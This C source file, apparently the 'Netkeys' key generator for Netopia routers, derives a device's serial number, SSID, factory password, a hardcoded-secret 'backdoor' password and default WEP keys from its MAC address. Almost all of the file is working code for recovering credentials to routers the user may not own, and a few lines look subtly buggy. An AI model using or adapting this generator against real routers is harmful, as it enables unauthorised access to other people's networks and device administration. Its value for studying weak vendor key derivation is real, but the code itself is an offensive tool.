/**
 *  The MIT License:
 *
 *  Copyright (c) 2007, 2010 Kevin Devine
 *
 *  Permission is hereby granted,  free of charge,  to any person obtaining a
 *  copy of this software and associated documentation files (the "Software"),
 *  to deal in the Software without restriction,  including without limitation
 *  the rights to use,  copy,  modify,  merge,  publish,  distribute,
 *  sublicense,  and/or sell copies of the Software,  and to permit persons to
 *  whom the Software is furnished to do so,  subject to the following
 *  conditions:
 *
 *  The above copyright notice and this permission notice shall be included in
 *  all copies or substantial portions of the Software.
 *
 *  THE SOFTWARE IS PROVIDED "AS IS",  WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 *  IMPLIED,  INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 *  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 *  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,  DAMAGES OR OTHER
 *  LIABILITY,  WHETHER IN AN ACTION OF CONTRACT,  TORT OR OTHERWISE,
 *  ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
 *  OTHER DEALINGS IN THE SOFTWARE.
 */

#if _MSC_VER
#define snprintf _snprintf
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>

#include <openssl/md5.h>
#include <openssl/sha.h>

#define MAC_LEN 12
#define MAX_WEP_PW 32

#define FACTORY_PW_LEN 8
#define BACKDOOR_PW_LEN 16

#define ROL32(a, n)(((a) << (n)) | (((a) & 0xffffffff) >> (32 - (n))))
#define ROR32(a, n)((((a) & 0xffffffff) >> (n)) | ((a) << (32 - (n))))

#ifdef BIGENDIAN
# define SWAP32(n) (n)
#else
# define SWAP32(n) \
    ROR32((((n & 0xFF00FF00) >> 8) | ((n & 0x00FF00FF) << 8)), 16)
#endif

char *bin2hex(uint8_t dig[], char str[], size_t n) {
    size_t i;

    for (i = 0; i < n; i++) {
        snprintf(&str[i*2], sizeof(&str[i*2]), "%02x", dig[i]);
    }
    return str;
}

/**
 *
 *  convert MAC to serial number
 *
 */
uint64_t mac2serial(uint64_t mac) {
    uint64_t oui = (mac >> 24);
    uint64_t serial = (mac & 0xFFFFFF);

    switch (oui) {
      case 0xC5 :
        break;
      case 0xFCC :
        serial |= 0x1000000;
        break;
      case 0x1D6B :
        serial |= 0x2000000;
        break;
      default:
        serial |= (oui << 24);
        break;
    }
    return serial;
}

const char *lyrics[] =
{   "Although your world wonders me, ",
    "with your superior cackling hen,",
    "Your people I do not understand,",
    "So to you I shall put an end and",
    "You'll never hear surf music aga",
    "Strange beautiful grassy green, ",
    "With your majestic silver seas, ",
    "Your mysterious mountains I wish" };

const char *digits[] =
{   "Zero", "One", "Two", "Three", "Four",
    "Five", "Six", "Seven", "Eight", "Nine" };

char *serial2str(char str[], uint64_t serial) {
    size_t len;
    int i;
    char buf[128];

    snprintf(buf, sizeof(buf), "%llu", serial);
    len = strlen(buf);
    str[0] = 0;

    for (i = 0; i < len; i++) {
        strcat(str, digits[ buf[i] - '0' ]);
    }
    return str;
}

/**
 *
 *  generate WEP keys from string
 *
 */
void create_wep(char pw[]) {
    SHA_CTX ctx;
    size_t i;
    uint8_t keys[SHA_DIGEST_LENGTH*8+1];
    char wep_key[32];
    
    for (i = 0; i < 8; i++) {
        SHA1_Init(&ctx);
        SHA1_Update(&ctx, pw,  strlen(pw));
        SHA1_Update(&ctx, lyrics[i], strlen(lyrics[i]));
        SHA1_Final(&keys[i*16], &ctx);
    }
    
    for (i = 0; i < 4; i++) {
        printf("  Encryption Key #%i %s\n", i+1,
          bin2hex(&keys[(i * 13)], wep_key, 13));
    }
}

/**
 *
 *  convert MAC string to binary
 *
 *  bytes can be separated by colon or hyphen
 *  
 */
uint64_t mac2bin(char mac_str[]) {
    char tmp[32];
    size_t i, j;
    uint64_t bin;
    size_t len = strlen(mac_str);
    
    /* should be between 12 and 17 bytes */
    if (len < 12 || len > 17) {
        printf("\nInvalid MAC Length : \"%s\" = %i\n", mac_str, len);
        exit(0);
    }

    /* skip hyphens and colons, ensure hex */
    for (i = 0, j = 0;i < len;i++) {
        if (mac_str[i] == ':' || mac_str[i] == '-') continue;
        
        if (!isxdigit((int)mac_str[i])) {
            printf("\nInvalid MAC format: \"%s\"\n", mac_str);
            exit(0);
        }
        tmp[j++] = mac_str[i];
    }
    sscanf(tmp, "%llx", &bin);
    return bin;
}

/**
 *
 *  Generate Factory password from mac
 *
 */
char *factory_passw(uint64_t mac, char pw[]) {
    int i;
    uint32_t m = (mac2serial(mac) & 0xFFFFFFFF);

    pw[FACTORY_PW_LEN] = 0;

    for (i = 0; i < FACTORY_PW_LEN; i++) {
        pw[i] = (m % 26) + 'a';
        m >>= 2;
    }
    return pw;
}

/**
 *
 *  generate Backdoor password from mac
 *
 */
char *backdoor_passw(uint64_t mac, char pw[]) {
    MD5_CTX ctx;
    uint8_t challenge[8];
    uint8_t dgst[16];
    uint32_t m;
    uint8_t secret[] =
    { 0x8B, 0x15, 0x48, 0xA6, 0x04, 0x08, 0x8B, 0x02,
      0x85, 0xC0, 0x74, 0x1C, 0x8D, 0x74, 0x26, 0x00 };
      
    memset(challenge, 0, sizeof(challenge));
    pw[BACKDOOR_PW_LEN] = 0;

    m = SWAP32((mac2serial(mac) & 0xFFFFFFFF));

    MD5_Init(&ctx);
    MD5_Update(&ctx, &m, 4);
    MD5_Update(&ctx, challenge, 8);    // random 64-bit challenge
    MD5_Update(&ctx, secret, 16);
    MD5_Final(dgst, &ctx);

    return bin2hex(dgst, pw, 8);
}

int main(int argc, char *argv[]) {
    uint64_t mac, serial;
    char pw1[FACTORY_PW_LEN+1], pw2[BACKDOOR_PW_LEN+1];
    char mac_str[32], serial_str[256];
    char *wep_pw;

    puts("\n  Netkeys v1.1 - Netopia key generator."
         "\n  Copyright (c) 2007, 2010 Kevin Devine\n");

    if (argc < 2) {
        printf("  Usage: netkeys <required MAC> <optional password>\n");
        return 0;
    }

    /* convert MAC to binary/string */
    mac = mac2bin(argv[1]);
    serial = mac2serial(mac);

    /* print details */
    printf("\n  Serial Number : %llu"
           "\n  MAC           : %llX"
           "\n  SSID          : %08o"
           "\n  Factory Pass  : %s"
           "\n  Backdoor Pass : %s\n",
           mac2serial(mac),
           mac,
           (uint32_t)((mac & 0xFFFFFF) ^ (mac >> 24)),
           factory_passw(mac, pw1),
           backdoor_passw(mac, pw2));

    /* WEP keys from serial number */
    printf("\n  [+] WEP - Manual (default)\n\n");
    create_wep(serial2str(serial_str, mac2serial(mac)));

    /* WEP keys from password */
    wep_pw = (argc == 2) ? "password" : argv[2];
    printf("\n  [+] WEP - Automatic using \"%s\"\n\n", wep_pw);
    create_wep(wep_pw);

    return 0;
}
